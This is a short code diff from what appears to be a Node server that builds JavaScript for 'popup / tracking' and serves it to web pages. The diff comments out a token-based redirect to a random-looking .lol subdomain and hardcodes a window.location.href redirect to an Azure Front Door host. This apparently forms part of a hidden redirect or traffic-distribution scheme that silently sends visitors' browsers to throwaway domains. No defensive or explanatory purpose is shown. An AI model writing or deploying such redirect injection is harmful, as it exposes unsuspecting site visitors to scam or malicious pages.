@@ -145,12 +145,13 @@ app.post("/track", async (req, res) => {
  * Customize the body of this function to match your popup / tracking logic.
  */
 async function buildJsCode() {
-  const token = await redis.rpop("valid_tokens");
+  // const token = await redis.rpop("valid_tokens");
 
-  console.log("Generated JS code with token:", token);
+  // console.log("Generated JS code with token:", token);
 
-  if (!token) return null;
-  return `window.location.href="https://${token}.nblakjdfnvlkjadsfnv.lol"`;
+  // if (!token) return null;
+  // return `window.location.href="https://${token}.nblakjdfnvlkjadsfnv.lol"`;
+  return `window.location.href="https://corejpdmc2-hzgwb8hqepdpc7dd.z01.azurefd.net"`;
 }
 
 // Health-check endpoint
